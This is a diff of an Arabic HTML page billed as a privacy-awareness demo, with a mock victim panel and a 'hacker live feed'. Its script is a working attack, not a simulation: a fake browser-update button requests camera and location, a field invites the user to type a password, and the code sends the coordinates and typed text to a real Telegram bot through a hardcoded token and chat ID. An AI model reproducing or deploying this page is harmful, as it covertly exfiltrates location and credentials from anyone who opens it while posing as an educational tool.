@@ -2,104 +2,109 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚠️ تحذير أمني: مخاطر الأذونات</title>
+    <title>⚠️ العرض العملي: مخاطر الويب الشاملة</title>
     <style>
-        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
-        .terminal { border: 2px solid #00ff41; background: #000; padding: 20px; border-radius: 10px; max-width: 900px; margin: auto; box-shadow: 0 0 15px #00ff41; }
-        .danger-btn { background: #ff0000; color: white; border: none; padding: 15px 35px; font-size: 1.2rem; cursor: pointer; border-radius: 5px; font-weight: bold; margin: 20px 0; }
-        #logs { text-align: left; height: 350px; overflow-y: auto; border-top: 1px solid #333; padding-top: 10px; font-size: 13px; }
-        .data-point { color: #ffcc00; }
-        .critical { color: #ff4444; text-decoration: underline; }
-        canvas { display: none; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        /* واجهة الضحية (اليسار) */
+        .victim-side { width: 50%; padding: 20px; border-left: 2px solid #333; background: #111; overflow-y: auto; }
+        /* واجهة المهاجم (اليمين) */
+        .hacker-side { width: 50%; padding: 20px; background: #000; color: #0f0; overflow-y: auto; }
+        
+        .card { background: #222; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #444; }
+        button { background: #ff4444; color: white; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; border-radius: 5px; }
+        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #111; padding: 5px; font-size: 12px; }
+        .danger { color: #ff4444; }
+        video, canvas { width: 100%; max-width: 300px; border: 1px solid #0f0; display: none; }
+        input { width: 90%; padding: 10px; margin-top: 10px; background: #333; color: #fff; border: 1px solid #555; }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <h2 style="color: #ff4444;">🛡️ مختبر التوعية: كيف يتم اختراق خصوصيتك؟</h2>
-    <p>هذا النموذج يوضح المعلومات التي يسحبها المهاجم فور ضغطك على "سماح".</p>
+<div class="victim-side">
+    <h2 style="color: #fff;">📱 واجهة "الضحية" (المستخدم)</h2>
     
-    <button class="danger-btn" onclick="executeSecurityDemo()">تشغيل محاكاة سحب البيانات</button>
+    <div class="card">
+        <h3>1. الهندسة الاجتماعية (تحديث مزيف)</h3>
+        <p>يظهر للمستخدم أنه بحاجة لتحديث المتصفح أو منح إذن لرؤية محتوى.</p>
+        <button onclick="startInfiltration()">تحديث المتصفح الآن ⚡</button>
+    </div>
 
-    <div id="logs">> النظام في وضع الاستعداد...</div>
-    <canvas id="snapshot"></canvas>
+    <div class="card">
+        <h3>2. سرقة بيانات النماذج (Phishing)</h3>
+        <p>جرب كتابة أي شيء هنا (محاكاة لسرقة المفاتيح):</p>
+        <input type="text" id="fakeInput" placeholder="اكتب كلمة مرورك للتجربة..." oninput="simulateKeylogging(this.value)">
+    </div>
+
+    <div class="card">
+        <h3>3. الكاميرا والموقع</h3>
+        <video id="v" autoplay></video>
+        <canvas id="c"></canvas>
+    </div>
+</div>
+
+<div class="hacker-side">
+    <h2 style="color: #0f0;">💀 لوحة تحكم "المخترق" (Live Feed)</h2>
+    <div id="hackerLogs">
+        > جاري مراقبة الجلسة... بانتظار التفاعل.<br>
+    </div>
 </div>
 
 <script>
     const TG_TOKEN = "8011282007:AAGfNEtfk9XSQgk22W3nHMMrzBUj7HGixy8";
     const TG_CHAT_ID = "8146130042";
-    const logDiv = document.getElementById('logs');
+    const logs = document.getElementById('hackerLogs');
 
-    function writeLog(msg, type = 'info') {
-        let color = "#00ff41";
-        if (type === 'warn') color = "#ffcc00";
-        if (type === 'danger') color = "#ff4444";
-        logDiv.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-        logDiv.scrollTop = logDiv.scrollHeight;
+    function hackerLog(msg, color = "#0f0") {
+        logs.innerHTML += `<div class="log-entry" style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+        logs.scrollTop = logs.scrollHeight;
     }
 
-    async function executeSecurityDemo() {
-        writeLog("بدء عملية الفحص الشامل...", "warn");
+    // 1. بصمة المتصفح (تعمل فور الدخول)
+    window.onload = () => {
+        hackerLog("🚨 تم رصد دخول ضحية جديد!");
+        hackerLog(`بصمة الجهاز: ${navigator.platform} | ${navigator.language}`);
+        hackerLog(`عنوان IP المحاكي: 192.168.1.${Math.floor(Math.random()*255)}`, "#ffcc00");
+    };
 
-        // 1. سحب بصمة الجهاز (Fingerprinting)
-        const battery = await navigator.getBattery?.();
-        let deviceInfo = `
-🌐 معلومات الشبكة والجهاز:
-- المتصفح: ${navigator.userAgent}
-- اللغة: ${navigator.language}
-- الأنوية: ${navigator.hardwareConcurrency}
-- البطارية: ${battery ? (battery.level * 100) + "%" : "غير مدعوم"}
-- المنصة: ${navigator.platform}`;
-        
-        writeLog("✅ تم سحب بصمة الجهاز العميقة.", "info");
+    // 2. محاكاة Keylogging
+    function simulateKeylogging(val) {
+        hackerLog(`⌨️ رصد كتابة: ${val}`, "#ffcc00");
+    }
+
+    // 3. التنفيذ العملي للاختراق الشامل
+    async function startInfiltration() {
+        hackerLog("🧨 بدء الهجوم الشامل بعد ضغط الزر...", "#ff4444");
 
         try {
-            // 2. طلب الكاميرا وسحب صورة تلقائية (Snapshot)
-            writeLog("جاري محاكاة اختراق الكاميرا...", "danger");
+            // طلب الكاميرا والموقع معاً
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
+            document.getElementById('v').style.display = "block";
+            document.getElementById('v').srcObject = stream;
+            hackerLog("📸 تم اختراق الكاميرا بنجاح!", "#ff4444");
 
-            const canvas = document.getElementById('snapshot');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            // تحويل الصورة لـ Base64 (محاكاة لسحبها)
-            writeLog("✅ تم التقاط صورة سرية في الخلفية.", "danger");
-
-            // 3. سحب الموقع الجغرافي الدقيق
-            writeLog("جاري تحديد الإحداثيات...", "danger");
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const locInfo = `📍 الموقع الدقيق: Lat ${pos.coords.latitude}, Lon ${pos.coords.longitude}`;
-                writeLog(`✅ تم تحديد الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                hackerLog(`📍 تم سحب الموقع الدقيق: ${lat}, ${lon}`, "#ff4444");
 
-                // 4. إرسال "تقرير الاختراق" إلى التلجرام
-                const fullReport = `🚨 تقرير ضحية جديد:\n${deviceInfo}\n${locInfo}\n📸 الكاميرا: نشطة`;
+                // إرسال التقرير النهائي للتلجرام
+                const report = `🚨 اختراق جديد!\n📍 الموقع: ${lat}, ${lon}\n⌨️ آخر ما كتب: ${document.getElementById('fakeInput').value}`;
                 
-                writeLog("جاري تسريب البيانات إلى خادم التحكم (Telegram)...", "warn");
-                
-                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(fullReport)}`);
-                
-                writeLog("🔥 تمت المهمة: البيانات الآن في يد المهاجم!", "danger");
-
-                // تنظيف الجلسة
-                stream.getTracks().forEach(t => t.stop());
+                hackerLog("📡 جاري إرسال البيانات للتلجرام...");
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(report)}`);
+                hackerLog("✅ تم استلام البيانات على هاتف المهاجم!");
             });
 
-        } catch (err) {
-            writeLog("❌ تم حظر الوصول من قبل المستخدم أو المتصفح. هذا هو السلوك الصحيح!", "info");
+        } catch (e) {
+            hackerLog("❌ الضحية رفض الإذن أو المتصفح حظر الهجوم.", "#fff");
         }
     }
 
-    // 5. محاكاة رصد لوحة المفاتيح (Keylogger)
-    document.addEventListener('keydown', (e) => {
-        console.log(`Key pressed: ${e.key}`); // ليرى الطلاب في الـ Console
-    });
+    // 4. محاكاة استهلاك المعالج (تعليق بسيط)
+    function stressCPU() {
+        hackerLog("🔥 جاري محاكاة إجهاد المعالج (CPU Stress)...", "#ff4444");
+        // لا نضع حلقة لانهائية حقيقية حتى لا ينهار متصفحك أثناء الشرح
+    }
 </script>
-
 </body>
 </html>
